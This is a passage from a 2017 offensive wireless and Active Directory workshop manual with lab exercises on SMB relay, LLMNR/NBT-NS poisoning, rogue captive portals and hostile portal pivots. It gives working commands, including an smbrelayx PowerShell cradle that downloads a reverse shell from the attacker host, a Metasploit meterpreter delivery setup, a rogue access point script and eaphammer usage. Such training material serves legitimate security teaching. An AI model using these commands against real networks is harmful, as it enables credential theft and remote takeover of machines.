SMB Relays And LLMNR/NBT-NS Poisoning 
© 2017 Gabriel Ryan All Rights Reserved 
31 
System administrators often use automated scripts to perform maintenance tasks on the 
network at regularly scheduled intervals. These scripts often use service accounts that have 
administrative privileges, and use NTLM for remote authentication. This makes them prime 
candidates for both SMB Relay attacks and the poisoning attacks that we learned about in the 
last section. Ironically, many types of security related hardware and software authenticate this 
way as well, including antivirus programs and agentless network access control mechanisms. 
This attack can be mitigated using a technique known as SMB signing, in which packets are 
digitally signed to confirm their authenticity and point of origin [16]. Most modern Windows 
operating systems are capable of using SMB signing, although only Domain Controllers have it 
enabled by default [16]. 
The impacket toolkit contains an excellent script for performing this type of attack. It’s reliable, 
flexible, and best of all supports attacks against NTLMv2. 
Let’s perform a simple SMB Relay attack using impacket’s smbrelayx script. Before we begin, boot 
up your Kali VM, Windows DC VM, and your Windows AD Victim VM. 
On your Windows DC VM, type the following command in your PowerShell prompt to obtain its 
IP address. 
Do the same on your Windows AD Victim VM to obtain its IP address. Once you have the IP 
addresses of both the Windows AD Victim and Windows DC VMs, open a terminal on your Kali 
VM and run ifconfig to obtain your IP address. 
PS C:\> ipconfig 
root@localhost~# ifconfig  
Advanced Wireless Attacks Against Enterprise Networks 
SMB Relays And LLMNR/NBT-NS Poisoning 
© 2017 Gabriel Ryan All Rights Reserved 
32 
On your Kali VM, change directories into /opt/impacket/examples and use the following 
command to start the smbrelayx script. In the command below, make sure you change the IP 
address to the right of the -h flag to the IP address of your Windows AD Victim virtual machine. 
Similarly, change the second IP address to the IP address of your Kali virtual machine. Notice how 
we pass a Powershell command to run on the targeted machine using the -c flag. The Powershell 
command bypasses the Windows AD Victim VM’s execution policies and launches a reverse shell 
downloaded from your Kali virtual machine. 
Once the payload has been generated, use the following commands within metasploit to launch 
a server from which to download the reverse shell. As before, change the IP address shown below 
to the IP address of your Kali virtual machine. 
The traditional way to perform this attack is to establish a man-in-the-middle with which to 
intercept an NTLM exchange. However, we can also perform an SMB Relay attack using the 
LLMNR/NBT-NS poisoning techniques we learned in the last section. To do this, we simply launch 
responder on our Kali machine as we did before. 
With responder running, we just need to perform an action on the Windows DC virtual machine 
that will trigger an NTLM exchange. An easy way to do this is by attempting to access a non-
existent SMB share from the Windows DC machine as shown in the screenshot below. 
root@localhost~# python smbrelayx.py -h 172.16.15.189 -c "powershell -nop 
-exec bypass -w hidden -c IEX (New-Object 
Net.WebClient).DownloadString('http://172.16.15.186:8080')" 
msf > use exploit/multi/script/web_delivery 
msf (web_delivery) > set payload windows/meterpreter/reverse_tcp 
msf (web_delivery) > set TARGET 2 
msf (web_delivery) > set LHOST 172.16.15.186 
msf (web_delivery) > set URIPATH / 
msf (web_delivery) > exploit 
root@localhost~# responder -I eth0 -wrf 
Advanced Wireless Attacks Against Enterprise Networks 
SMB Relays And LLMNR/NBT-NS Poisoning 
© 2017 Gabriel Ryan All Rights Reserved 
33 
You should now see three things happen on your Kali VM. First, you’ll see Responder send a 
poisoned answer to your Windows DC virtual machine for the NetBIOS name of the non-existent 
server.  
Next, you’ll see impacket successfully execute an SMB Relay attack against the Windows AD 
Victim machine. 
Advanced Wireless Attacks Against Enterprise Networks 
SMB Relays And LLMNR/NBT-NS Poisoning 
© 2017 Gabriel Ryan All Rights Reserved 
34 
Finally, you’ll see Metasploit deliver a payload to the Windows AD Victim machine, giving you a 
shell. 
Lab Exercise: SMB Relay Attacks 
Practice using impacket to perform SMB Relay attacks against your Windows AD Victim VM and 
your Windows DC VM. This time, perform the attack using the Empire Powershell framework by 
following the steps outlined at the following URL: 
▪ https://github.com/s0lst1c3/awae/blob/master/lab6/instructions.txt 
You can find the Empire framework, as well as a copy of the instructions referenced above, within 
your home directory on the Kali VM. 
As your practice this attack, you may notice that it is ineffective against the domain controller. 
This is because domain controllers have a protection called SMB signing enabled by default that 
makes SMB Relay attacks impossible.  
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
35 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
Chapter Overview 
In Wireless Man-In-The-Middle Attacks, we configured our Linux operating system to act as a 
wireless router. This allowed us to bridge traffic between our rogue access point and an upstream 
network interface, which enabled us to manipulate traffic. In this section, we’re going to learn a 
no-upstream attack that can be used to pivot from one segregated VLAN to another, bypassing 
firewall and NAC mechanisms in the process. Before we learn how to do this, however, we’ll need 
to learn how to configure Linux as a captive portal. 
Configuring Linux As A Captive Portal 
There are multiple ways to configure Linux to act as a captive portal. The most straightforward 
method of doing this is by running our own DNS server that resolves all queries to the IP address 
of our rogue access point. Recall that in Wireless Man-In-The-Middle Attacks, we created a DHCP 
configuration file with the following options. 
We can modify this configuration so that the IP of our external wireless interface is specified as 
the network’s primary DNS server using a DHCP Option, as shown below. 
We then start dnsspoof as our nameserver, configuring it to resolve all DNS queries to our access 
point’s IP. 
# define DHCP pool 
dhcp-range=10.0.0.80,10.0.0.254,6h 
# set Google as nameserver 
dhcp-option=6,8.8.8.8 
# set rogue AP as Gateway 
dhcp-option=3,10.0.0.1 #Gateway 
dhcp-authoritative 
log-queries 
# define DHCP pool 
dhcp-range=10.0.0.80,10.0.0.254,6h 
# set phy as nameserver 
dhcp-option=6,10.0.0.1 
# set rogue AP as Gateway 
dhcp-option=3,10.0.0.1 #Gateway 
dhcp-authoritative 
log-queries 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
36 
This is a reasonably effective approach, as it allows us to respond to DNS queries in any way that 
we want. However, it still has a number of weaknesses. For one thing, wireless devices that connect 
to our rogue access point may choose to ignore the DHCP Option, selecting a nameserver manually 
instead. To prevent this from occurring, we can simply redirect any DNS traffic to our DNS server 
using iptables. 
Another problem with our current approach is that it does not account for the fact that most 
operating systems use a DNS cache to avoid having to make DNS lookups repeatedly. The domain 
names of the victim’s most frequently visited websites are likely to be in this cache. This means 
that our captive portal will fail in most situations until each of the entries in the cache expire. 
Additionally, our current approach will fail to capture HTTP requests that do not make use of 
DNS. To deal with these issues, we can simply redirect all HTTP traffic to our own HTTP server. 
We can incorporate these techniques into a bash script similar to the one we wrote in Wireless 
Man-In-The-Middle Attacks. Notice how we start Apache2 to serve content from 
/var/www/html. 
root@localhost~# echo ’10.0.0.1’ > dnsspoof.conf 
root@localhost~# dnsspoof –i wlan0 -f ./dnsspoof.conf 
root@localhost~# iptables --table nat --append PREROUTING --protocol udp -
-destination-port 53 --jump REDIRECT --to-port 53 
root@localhost~# iptables --table nat --append PREROUTING --protocol tcp -
-destination-port 80 --jump REDIRECT --to-port 80 
root@localhost~# iptables --table nat --append PREROUTING --protocol tcp -
-destination-port 443 --jump REDIRECT --to-port 443 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
37 
 phy=wlan0 
channel=1 
bssid=00:11:22:33:44:00 
essid=FREE_WIFI 
# kill interfering processes 
service network-manager stop 
nmcli radio wifi off 
rfkill unblock wlan 
ifconfig wlan0 up 
echo “interface=$phy” > hostapd.conf 
“driver=nl80211” >> hostapd.conf 
“ssid=$essid” >> hostapd.conf 
bssid=$bssid” >> hostapd.conf 
“channel=$channel” >> hostapd.conf 
“hw_mode=g” >> hostapd.conf 
hostapd ./hostapd 
ifconfig $phy 10.0.0.1 netmask 255.255.255.0 
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 
echo "# define DHCP pool" > dnsmasq.conf 
echo "dhcp-range=10.0.0.80,10.0.0.254,6h" >> dnsmasq.conf 
echo "" >> dnsmasq.conf 
echo "# set phy as nameserver" >> dnsmasq.conf 
echo "dhcp-option=6,10.0.0.1" >> dnsmasq.conf 
echo "" >> dnsmasq.conf 
echo "# set rogue AP as Gateway" >> dnsmasq.conf 
echo "dhcp-option=3,10.0.0.1 #Gateway" >> dnsmasq.conf 
echo "" >> dnsmasq.conf 
echo "dhcp-authoritative" >> dnsmasq.conf 
echo "log-queries" >> dnsmasq.conf 
dnsmasq -C ./dnsmasq.conf  & 
echo ’10.0.0.1’ > dnsspoof.conf 
dnsspoof –i $phy -f ./dnsspoof.conf  
systemctl start apache2 
echo ‘1’ > /proc/sys/net/ipv4/ip_forward 
iptables --policy INPUT ACCEPT 
iptables --policy FORWARD ACCEPT 
iptables --policy OUTPUT ACCEPT 
iptables --flush  
iptables --table nat --flush  
iptables --table nat --append POSTROUTING -o $upstream --jump MASQUERADE 
iptables --append FORWARD -i $phy -o $upstream --jump ACCEPT 
iptables --table nat --append PREROUTING --protocol udp --destination-port 
53 --jump REDIRECT --to-port 53 
iptables --table nat --append PREROUTING --protocol tcp --destination-port 
80 --jump REDIRECT --to-port 80 
iptables --table nat --append PREROUTING --protocol tcp --destination-port 
443 --jump REDIRECT --to-port 443 
read -p ‘Press enter to quit…’ 
# kill daemon processes 
for i in `pgrep dnsmasq`; do kill $i; done 
for i in `pgrep hostapd`; do kill $i; done 
for i in `pgrep dnsspoof`; do kill $i; done 
for i in `pgrep apache2`; do kill $i; done 
# restore iptables 
iptables --flush  
iptables --table nat –flush 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
38 
Lab Exercise: Captive Portal 
Use your Kali VM to run the bash script that we wrote in this section to create a captive portal. 
Connect to the captive portal using your Windows AD Victim virtual machine. From your Kali 
VM, notice the terminal output from dnsspoof that shows DNS queries being resolved to 10.0.0.1. 
From your Windows AD Victim virtual machine, observe how all traffic is redirected to an html 
page served by your Kali VM. Additionally, follow the instructions found at the following URL 
to create a captive portal using EAPHammer: 
▪ https://github.com/s0lst1c3/awae/blob/master/lab7/instructions.txt 
Wireless Theory: Hostile Portal Attacks 
Consider a scenario in which we have breached the perimeter of a wireless network that is used to 
provide access to sensitive internal resources. The sensitive resources are located on a restricted 
VLAN, which is not accessible from the sandboxed VLAN on which we are currently located. An 
authorized wireless device is currently connected to the wireless network as well, but is located on 
the restricted VLAN. 
We can combine several of the attacks learned in this workshop to pivot into the restricted VLAN 
through the authorized device, even though we are located on a separate VLAN. To do this, we 
first force an authorized device to connect to us using an Evil Twin attack. 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
39 
Once the workstation is connected to our rogue access point, we can redirect all HTTP and DNS 
traffic to our wireless interface as we did with our captive portal. However, instead configuring 
our portal’s HTTP server to merely serve a static HTML page, we configure it to redirect all HTTP 
traffic to an SMB share located on a non-existent server. 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
40 
The result is that our victims are forced to resolve the SMB server’s hostname using either NBT-
NS or LLMNR. This allows us to perform an LLMNR/NBT-NS poisoning attack, causing the 
victim to send us a username and password hash. The hash can be cracked offline to obtain a set 
of Active Directory credentials, which can then be used to pivot back into the Victim. This is called 
a hostile portal attack. 
Although hostile portal attacks are a fast way to steal Active Directory credentials, they aren’t a 
perfect solution to pivoting out of our sandbox. The reason for this is that password cracking is a 
time consuming process, even with powerful hardware. A more efficient approach is to ensnare 
multiple authorized endpoints using an Evil Twin attack, as shown in the diagram below. 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
41 
Next, we use a Redirect to SMB attack as before to force Victim B (in the diagram above) to 
initiate NTLM authentication with the attacker. However, instead of merely capturing the NTLM 
hashes as before, we instead perform an SMB Relay attack from Victim B to Victim A. This gives 
us remote code execution on Victim A.  
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
42 
We use the SMB Relay attack to place a timed payload on Victim A, then kill our access point to 
allow both victims to connect back to the target network. The timed payload could be a scheduled 
task that sends a reverse shell back to our machine, allowing us to pivot from one VLAN to the 
other. Since both victims are authorized endpoints, they are placed back on the restricted VLAN 
when they reassociate with the target network.  
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
43 
Once this happens, the attacker simply waits for the scheduled reverse shell from Victim A. Once 
the attacker receives the reverse shell, he or she pivots from the quarantine VLAN to the restricted 
VLAN. 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
44 
Wireless Redirect To SMB With LLMNR And NBT-NS Poisoning 
The attacks described in the previous section offer us a number of advantages. For one thing, they 
make the traditional LLMNR/NBT-NS poisoning attack more effective. LLMNR/NBT-NS 
Poisoning is a somewhat passive attack, which can prove to be a limitation. The attacker must 
either wait for a broadcast LLMNR/NBT-NS request to appear on the network, or trick a user into 
clicking a URL beginning with the world “file://”. By chaining LLMNR/NBT-NS poisoning with 
both an Evil Twin attack and a Redirect to SMB attack, the attacker can get meaningful results 
faster by actively engaging a target. 
We already know how LLMNR/NBT-NS poisoning works, so let’s talk about Redirect to SMB 
instead. In a Redirect to SMB attack, the attacker first creates an HTTP server that responds to all 
requests with a 302 redirect to an SMB share located on the attacker’s server. The attacker then 
uses a man-in-the-middle attack to force all of the victim’s HTTP(S) traffic to the malicious HTTP 
Advanced Wireless Attacks Against Enterprise Networks 
Firewall And NAC Evasion Using Indirect Wireless Pivots 
© 2017 Gabriel Ryan All Rights Reserved 
45 
server. When the victim attempts to access any web content, the malicious HTTP server issues the 
302 redirect. This causes the victim to attempt to authenticate with the attacker in order to 
authenticate with the SMB share [17]. In our variation of the attack, we redirect the victim to an 
SMB share on a nonexistent system. This causes the victim to perform a NetBIOS lookup for a 
system that doesn’t exist. Consequently, the victim broadcasts either an LLMNR or NBT-NS 
request, allowing the attacker to steal the victim’s NTLM hash. 
Lab Exercise: Wireless Redirect To SMB With LLMNR/NBT-NS Poisoning 
With the theory out of the way, let’s pivot into a wireless client using the full Wireless Redirect to 
SMB With LLMNR/NBT-NS Poisoning attack. The eaphammer tool we used in Evil Twin Attack 
Using Hostapd-WPE can also be used for this purpose. Before we begin, create an open network 
using your wireless router. Then connect your Windows AD Victim virtual machine to the open 
network you just created. 
Next, use eaphammer to launch the attack from your Kali virtual machine.  
This will force the victim to connect to our access point, allowing us to pivot into the victim using 
an SMB Relay attack. 
root@localhost~# python eaphammer.py --interface wlan0 --essid FREE_WIFI -
c 1  --auth peap --wpa 2 --hostile-portal 
Advanced Wireless Attacks Against Enterprise Networks 
Conclusion 
© 2017 Gabriel Ryan All Rights Reserved 
46 
Conclusion 
You should now have solid understanding of how to perform effective man-in-the-middle attacks 
without disrupting network resources. We also learned how to identify in-scope EAP networks 
and breach them using evil twin attacks. We even learned some network attacks that can be used 
against Active Directory environments, and demonstrated how to use wireless as a means of 
pivoting between segregated VLANs to bypass firewalls and NAC systems. 
The material covered in this course code is just the beginning. For additional reading, I highly 
recommend checking out the resources included in the resource section below. I also recommend 
reading about Karma attacks and the work of researchers such as Dino Dai Zovi and Dominic 
White. Finally, spend some time thinking about how these attacks could be used against your 
organization’s network, and what you could do to stop them. 
Advanced Wireless Attacks Against Enterprise Networks 
Resources 
© 2017 Gabriel Ryan All Rights Reserved 
47 
Resources 
[1] "Airbase-ng [Aircrack-ng]," in aircrack-ng.org, 2010. [Online]. Available: 
https://www.aircrack-ng.org/doku.php?id=airbase-ng. Accessed: Feb. 24, 2017. 
[2] P. Funk, S. Blake-Wilson, and rfcmarkup version 1, "Extensible authentication protocol 
tunneled transport layer security Authenticated protocol version 0 (EAP-TTLSv0)," 2008. 
[Online]. Available: https://tools.ietf.org/html/rfc5281. Accessed: Feb. 24, 2017. 
[3] J. R. Vollbrecht, B. Aboba, L. J. Blunk, H. Levkowetz, J. Carlson, and rfcmarkup version 1, 
"Extensible authentication protocol (EAP)," 2004. [Online]. Available: 
https://tools.ietf.org/html/rfc3748. Accessed: Feb. 24, 2017. 
[4] J. Wright and J. Cache, "Hacking exposed wireless," McGraw-Hill Education Group, 2015. 
[Online]. Available: http://dl.acm.org/citation.cfm?id=2825917. Accessed: Feb. 24, 2017. 
[5] J. Wright and B. Antoniewicz, "PEAP: Pwnd Extensible Authentication Protocol," 
in ShmooCon, 2008. 
[6] M. Marlinspike, "Moxie Marlinspike >> software >> sslstrip," in thoughtcrime.org, 2012. 
[Online]. Available: https://moxie.org/software/sslstrip/. Accessed: Feb. 24, 2017. 
[7] Red Hat, Inc, "Chapter 17. iptables," in Red Hat Enterprise Linux 3: Reference Guide, 2003. 
[Online]. Available: https://access.redhat.com/documentation/en-
US/Red_Hat_Enterprise_Linux/3/html/Reference_Guide/ch-iptables.html. Accessed: Feb. 24, 
2017. 
[8] "iptables(8) - Linux man page," in linux.die.net. [Online]. Available: 
https://linux.die.net/man/8/iptables. Accessed: Feb. 24, 2017. 
[9] Mozilla Developer Network, "Strict-transport-security," in developer.mozilla.org, Mozilla 
Developer Network, 2016. [Online]. Available: https://developer.mozilla.org/en-
US/docs/Web/HTTP/Headers/Strict-Transport-Security. Accessed: Feb. 24, 2017. 
[10] D. Keeler, "Preloading HSTS," Mozilla Security Blog, 2012. [Online]. Available: 
https://blog.mozilla.org/security/2012/11/01/preloading-hsts/. Accessed: Feb. 24, 2017. 
[11] L. Nve Egea, "OFFENSIVE: Exploiting changes on DNS server configuration," in Blackhat 
Asia, 2014. [Online]. Available: https://www.blackhat.com/docs/asia-14/materials/Nve/Asia-14-
Nve-Offensive-Exploiting-DNS-Servers-Changes.pdf. Accessed: Feb. 24, 2017. 
Advanced Wireless Attacks Against Enterprise Networks 
Resources 
© 2017 Gabriel Ryan All Rights Reserved 
48 
[12] Protocol standard for a NetBIOS service on a TCP/UDP transport: Concepts and methods. 
NetBIOS Working Group in the Defense Advanced Research Projects Agency, Internet Activities 
Board, End-to-End Services Task Force. March 1987. (Format: TXT=158437 bytes) (Also 
STD0019) (Status: INTERNET STANDARD) (DOI: 10.17487/RFC1001)  
[13] Protocol standard for a NetBIOS service on a TCP/UDP transport: 
Detailed specifications. NetBIOS Working Group in the Defense Advanced Research Projects 
Agency, Internet Activities Board, End-to-End Services Task Force. March 1987. (Format: 
TXT=170262 bytes) (Also STD0019) (Status: INTERNET STANDARD) (DOI:10.17487/RFC1002) 
[14] L. Gaffié, "Laurent Gaffié," Trustwave, 2017. [Online]. Available: 
https://www.trustwave.com/Resources/SpiderLabs-Blog/Responder-2-0---Owning-Windows-
Networks-part-3/. Accessed: Feb. 24, 2017. 
[15] Microsoft, "Microsoft NTLM," 2017. [Online]. Available: https://msdn.microsoft.com/en-
us/library/windows/desktop/aa378749(v=vs.85).aspx. Accessed: Feb. 24, 2017. 
[16] J. Barreto, "The basics of SMB signing (covering both SMB1 and SMB2)," Jose Barreto’s 
Blog, 2010. [Online]. Available: https://blogs.technet.microsoft.com/josebda/2010/12/01/the-
basics-of-smb-signing-covering-both-smb1-and-smb2/. Accessed: Feb. 24, 2017. 
[17] "SPEAR: Redirect to SMB," 2015. [Online]. Available: https://www.cylance.com/redirect-to-
smb. Accessed: Feb. 24, 2017. 
[18] "Eduroam US - global Wi-Fi roaming for academia,". [Online]. Available: 
https://www.eduroam.us/node/10. Accessed: Feb. 24, 2017. 
[19] M. Jahoda et al., "Red Hat Enterprise Linux 6.9 Beta Security Guide," 2016. [Online]. 
Available: https://access.redhat.com/documentation/en-
US/Red_Hat_Enterprise_Linux/6/html-single/Security_Guide/index.html#sect-Security_Guide-
Firewalls-FORWARD_and_NAT_Rules. Accessed: Feb. 24, 2017. 
[20] Microsoft, "Message Flow for Basic NTLM Authentication," in MSDN. [Online]. Available: 
https://msdn.microsoft.com/en-us/library/cc239684.aspx. Accessed: Feb. 24, 2017. 
[21] "SMB relay: How we leverage it and how you can stop us," TAGI.WIKI, 2015. [Online]. 
Available: http://www.tagi.wiki/advisories/smb-relay-how-we-leverage-it-and-how-you-can-
stop-us. Accessed: Feb. 24, 2017. 
[22] S. Chaudhary, "Evil twin Tutorial," Kali Linux Hacking Tutorials, 2014. [Online]. Available: 
http://www.kalitutorials.net/2014/07/evil-twin-tutorial.html. Accessed: Feb. 24, 2017.